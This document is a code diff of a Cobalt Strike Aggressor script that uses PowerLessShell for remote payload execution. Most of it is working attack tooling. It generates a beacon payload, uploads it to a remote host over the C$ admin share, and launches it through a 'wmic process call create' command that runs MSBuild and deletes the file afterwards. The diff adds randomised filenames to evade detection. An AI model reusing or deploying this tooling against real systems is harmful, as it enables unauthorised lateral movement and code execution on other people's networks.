@@ -1,7 +1,4 @@
-#
-#
-# Aggressor script to simplify using PowerLessShell with Cobalt Strike (https://github.com/Mr-Un1k0d3r/PowerLessShell)
-# Author: MrT-F
+# # # Aggressor script to simplify using PowerLessShell with Cobalt Strike (https://github.com/Mr-Un1k0d3r/PowerLessShell) # Author: MrT-F
 # To use: load script. use macro "wmi_msbuild [target] [listener]" in beacon console
 #
 #
@@ -9,8 +6,21 @@
 #Register alias
 beacon_command_register("wmi_msbuild", "wmi lateral movement without powershell","Synopsis: wmi_msbuild [target] [listener]", "This uses Mr-Un1k0d3r's PowerLessShell (https://github.com/Mr-Un1k0d3r/PowerLessShell) to execute beacon's powershell payload on a remote system. You will need to copy the PowerLessShell repo to folder PowerLessShell in your cobaltstrike client directory (or edit the $pls_path variable here). Also, the PowerLessShell.py script assumes .NET framework 4.0.30319, so that must exist on the remote system. If it doesn't, edit the script ;)");
 
+sub gen_random_name {
+	#returns random filename .TMP
+	local('@alphabet $len $i $filename');
+	@alphabet = @("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
+	#Random filename length between 5 and 16
+	$len = rand(11) + 5;	
+	for($i = 0; $i < $len; $i++){
+		$filename .= rand(@alphabet);	
+	}
+	$filename .= ".TMP";
+	return $filename;
+}
+
 sub gen_payload {
-	local('$ps1','$pls_path','$handle');
+	local('$ps1 $pls_path $handle');
 	$ps1 = artifact($1, "powershell", true, "x86");
 	#Change this to the path of PowerLessShell (relative to cobaltstrike dir, or just absolute)
 	$pls_path = "PowerLessShell";
@@ -37,14 +47,14 @@ sub gen_cs {
 	}
 	#stdin to name files
 	writeb($handle,"payload.ps1\n");
-	writeb($handle, "payload.cs\n");
+	writeb($handle,"payload.cs\n");
 	#wait for generation to finish
 	wait($handle);
 	closef($handle);
 }
 
 sub wmi_msbuild_func {
-	local('$owd', '$ps1', '$handle', 'payload', '$command_line');
+	local('$owd $ps1 $handle $payload $command_line $filename');
 	#save working dir to restore later
 	$owd = cwd();
 	#ensure listener exists
@@ -70,11 +80,13 @@ sub wmi_msbuild_func {
 		warn($error);
 	}
 	closef($handle);	
-	bupload_raw($1,'\\\\'.$2.'\\C$\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\testing.cs',$payload);
+	$filename = gen_random_name();
+	bupload_raw($1,'\\\\'.$2.'\\C$\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\'.$filename,$payload);
 	#Built command line and execute - i  spawn cmd rather than directly calling msbuild so we can delete the file when beacon exits (less sneaky, but less cleanup at end of engagement)
 	$command_line = 'wmic /node:"';
 	$command_line .= $2;
-	$command_line .= '" process call create "cmd /c cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319 && MSBuild.exe testing.cs && del testing.cs"';
+	$command_line .= '" process call create "cmd /c cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319 && MSBuild.exe ';
+	$command_line .= $filename.' && del '.$filename.'"';
 	println($command_line);
 
 	#Run with beacon's "execute" 
